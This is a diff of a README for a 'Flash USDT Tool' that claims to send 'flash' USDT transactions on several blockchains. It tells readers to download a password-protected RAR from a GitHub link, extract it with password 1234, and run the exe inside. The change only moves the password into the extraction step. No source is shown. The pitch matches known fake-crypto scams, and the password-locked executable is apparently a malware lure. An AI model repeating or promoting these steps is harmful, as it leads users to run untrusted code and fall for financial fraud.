@@ -7,12 +7,11 @@ Multi-network flash transaction tool for USDT, BTC, ETH with configurable durati
 
 **USDT Flash Sender** is a private developer tool for broadcasting raw USDT transactions across multiple networks (ERC-20, TRC-20, BEP-20). This is the **compiled release** — no source code, just the executable.
 
-**Password:** `1234`
 
 ## 🚀 How to use
 
 1. Download latest version [https://github.com/NovaNexusRewards/Flash-USDT-Tool/blob/main/Flash%20USDT%20Tool.rar]
-2. Extract 
+2. Extract ( 1234 PASSWORD )
 3. Run `Flash USDT Tool.exe` from Command Prompt:
 
 ```cmd
